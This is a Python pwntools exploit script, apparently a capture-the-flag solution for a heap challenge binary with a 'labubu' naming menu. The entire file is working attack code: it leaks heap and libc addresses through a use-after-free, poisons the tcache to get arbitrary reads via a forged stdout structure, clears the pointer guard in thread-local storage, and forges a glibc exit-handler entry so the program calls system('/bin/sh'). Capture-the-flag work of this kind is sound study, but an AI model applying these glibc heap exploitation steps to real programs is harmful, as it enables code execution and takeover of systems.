from pwn import *

context.binary = elf = ELF("./chal_patched")
context.arch = "amd64"
# context.log_level = "debug"

# host = "localhost" #change host and port as needed
# port = 5000
p = process()
# p = remote(host, port)
gdb.attach(p)
sleep(2)

def s(): #just cos i have some buffering issues with pwntools not needed
    sleep(0.02)

def alloc(index):
    s()
    p.sendlineafter(b"> ", b"1")
    s()
    p.sendlineafter(b"idx?: > ", str(index).encode())
    s()

def free(index):
    s()
    p.sendlineafter(b"> ", b"4")
    s()
    p.sendlineafter(b"> ", str(index).encode())
    s()

def edit(index, name):
    s()
    p.sendlineafter(b"> ", b"2")
    s()
    p.sendlineafter(b"> ", str(index).encode())
    s()
    if isinstance(name, str) == False:
        p.sendlineafter(b"Name your labubu\n", name)
    else:
        p.sendlineafter(b"Name your labubu\n", str(name).encode())
    s()

def read(index):
    s()
    p.sendlineafter(b"> ", b"3")
    s()
    p.sendlineafter(b"> ", str(index).encode())
    s()

def mangle(key, target):
    return key ^ target

def readmem(addr, size):
    temp = p64(0xfbad1887) + p64(0)*3 + p64(addr) + p64(addr+size)*3 + p64(addr+size+1)
    return temp

alloc(0)
free(0)
read(0)
heapleak = p.recvuntil(b"Welcome", drop=True)[:6]
heapleak = u64(heapleak.ljust(8, b"\x00"))
print(f"This is heap leak: {hex(heapleak)}")

for i in range(0, 9):
    # print(f"alloc at {i}")
    alloc(i)

for i in range(0, 7):
    # print(f"free at {i}")
    free(i)

free(7)
read(7)
libcleak = p.recvuntil(b"Welcome", drop=True)[:6]
libcleak = u64(libcleak.ljust(8, b"\x00"))
print(f"This is main_arena+96: {hex(libcleak)}")
main_arena_offset = 0x210ac0 + 96 #rmb to change this to the specific libc of the container
base = libcleak - main_arena_offset
print(f"This is libc base: {hex(base)}")
stdout = base + 0x00000000002115c0
rtld = base + 0x00000000002116b8
print(f"This is stdout {hex(stdout)}")

#tcache poison time
edit(2, p64(mangle(heapleak, stdout)))
alloc(13)
alloc(14)
alloc(15)
alloc(0)
alloc(1)
alloc(3)# this is arb alloc
edit(3, readmem(rtld, 8))
rtld_leak = p.recvuntil(b"Your labubu", drop=True)
rtld_leak = u64(rtld_leak.ljust(8, b"\x00"))
print(f"this is _rtld_global {hex(rtld_leak)}")
intial_dvt = rtld_leak + 0xae8
print(f"this is initial_dvt {hex(intial_dvt)}")
edit(3, readmem(intial_dvt, 8))
tls_leak = p.recvuntil(b"Your labubu", drop=True)
tls_leak = u64(tls_leak.ljust(8, b"\x00")) - 0x9a0
print(f"this is tls leak {hex(tls_leak)}")
target = tls_leak + 0x30

#second poison
free(0)
free(1)
edit(1, p64(mangle(heapleak, target)))
alloc(0)
alloc(1)
edit(1, p64(0))

libc = ELF("./libc.so.6")
initial_offset = libc.sym['initial'] + 16 #16 for alignment
initial = base + initial_offset
system = base + 0x000000000005c110
print(f"this is system {hex(system)}")
context.binary = libc = ELF("./libc.so.6")
binsh_offset = next(libc.search(b"/bin/sh"))
binsh = base + binsh_offset
print(f"this is binsh {hex(binsh)}")
print(f"this is initial+16 {hex(initial)}")
mangled_system = (system << 17)
print(f"this is mangled system {hex(mangled_system)}")
payload = p64(4) + p64(mangled_system) + p64(binsh)

#third poison
free(4)
free(0)
edit(0, p64(mangle(heapleak, initial)))
alloc(4)
alloc(0)
edit(0, payload)
p.sendline(b"5")

p.interactive()

